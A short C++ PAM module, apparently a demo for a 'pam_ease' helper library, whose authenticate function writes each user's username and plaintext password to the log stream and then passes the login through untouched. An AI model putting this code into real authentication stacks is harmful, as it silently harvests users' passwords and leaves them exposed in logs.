#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include <iostream>

#include "pam_utils.hpp"

// PAM authentication function
extern "C" [[maybe_unused]] int pam_sm_authenticate(pam_handle_t* pamh, [[maybe_unused]] int flags,
                                                    [[maybe_unused]] int argc, [[maybe_unused]] const char** argv) {
	return pam_ease::handle_pam_exceptions([&]() -> int {
		auto auth = pam_ease::getLoginCredentials(pamh);

		std::clog << "Username: " << auth.first;
		if (auth.second) std::clog << " - Password: " << *auth.second;
		std::clog << std::endl;

		return PAM_IGNORE;
	});
}
